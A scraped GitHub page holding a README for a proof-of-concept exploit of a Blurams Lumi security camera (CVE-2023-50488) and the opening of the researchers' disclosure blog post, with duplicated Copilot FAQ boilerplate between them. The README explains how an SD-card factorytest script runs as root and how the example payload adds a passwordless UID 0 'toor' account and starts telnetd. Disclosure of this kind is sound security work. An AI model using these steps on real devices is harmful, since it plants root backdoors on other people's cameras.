## [README.md](#readme)

PoC exploit for Blurams Lumi Security Camera (A31C) version up to 23.0406.435.4120 (CVE-2023-50488).

For details see: <https://infosec.rm-it.de/2024/02/01/blurams-lumi-security-camera-analysis/>

Run `gen_auth_file.sh` to generate the file `auth.ini`, adjust `VERSION` variable if needed.

Copy the `auth.ini` file to an SD-card into a folder named `/factorytest/`.

Create a shell script with any payload you want to execute, place it also in `/factorytest/` folder, name it `factorytest.sh`.

Insert the SD-card into the camera device and reboot it. The `/factorytest/factorytest.sh` script will be executed with root privileges on the device.

See example files in `/factorytest/` in this repository.

The payload will create a new UID 0 account with the name `toor` without a password, and the `telnetd` service will be started.

The new `toor` account can then be used to connect via telnet to the device.

Note that executing the factorytest script will not fully start all services on the device (e.g. the main camera binary will not be started).

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

# Blurams Lumi Security Camera analysis

Posted on [2024-02-01](https://infosec.rm-it.de/2024/02/01/blurams-lumi-security-camera-analysis/ "14:57")  by  [Roman](https://infosec.rm-it.de/author/roman/ "View all posts by Roman")

Continuing the series of analysing cloud enabled devices (see [BASETech IP camera](https://infosec.rm-it.de/2020/11/04/basetech-ip-camera-analysis/) and [Meross Garage Door Opener](https://infosec.rm-it.de/2021/06/18/meross-smart-wi-fi-garage-door-opener-analysis/) for previous research), we have taken a look at the Blurams Lumi Security Camera (A31C). This research and blog post was created in a collaboration with my coworker [Arne](https://www.linkedin.com/in/arne-loose/). This particular device is marketed as a 2-way camera, allowing someone to press a button on the camera to establish live communication with the owner (e.g. for helping children or elderly). Accessing the video and controls of it is done through a mobile application as well as a web-client. You can of course view the video stream and control the device from anywhere in the world. A second device without the 2-way feature was also purchased (A31).

This is a rather long blog post, if you are only interested in the vulnerabilities you can skip right to them by skipping to [that chapter](#vulns). The vulnerabilities were closed by Blurams before the publication of this post.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/IMG_4468-e1698858314265-283x300.jpg)](https://infosec.rm-it.de/wp-content/uploads/2023/07/IMG_4468.jpg)

# Recon

To get the device working we first needed to install the “blurams” mobile application and register an account. For the purpose of this analysis a main account was created to which the camera was paired. Other accounts without any paired device were also created.

After that, logged in with the primary account to the mobile application the WiFi credentials are entered and the app is generating a QR code, this code is then scanned by the camera and it joins the WiFi.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/IMG_0004-169x300.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/IMG_0004.png)

Interestingly, this QR code appears to be encrypted. The content of this code is this (hexdump view):

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.25.41-1024x163.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.25.41.png)

This QR code might also contain the account ID of the user, since the mobile application appears to not directly communicate with the camera. The camera connects to the WiFi, obtains an IP address through DHCP and immediately connects to their cloud infrastructure. Encrypting all communication. Following is a capture of the initial Wireshark dump during and after the setup of the device.

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.29.40-1024x487.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.29.40.png)

Once connected to the network, the first step is to enumerate any open ports. This device however exposes none:

[![](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.46.11.png)](https://infosec.rm-it.de/wp-content/uploads/2023/07/Screenshot-2023-07-21-at-13.46.11.png)

All further communication with the device is routed through the cloud infrastructure of Blurams. The device uses STUN to allow communication of the mobile application with it. Even if such a device is deployed behind a firewall which blocks all access, STUN makes it possible to remotely access it.

# Investigating the web client

There is a web client available through https://client.blurams.com/ which can be used to stream the video and control the device. This client is particularly interesting since it is trivial to intercept its traffic via Burp Suite.

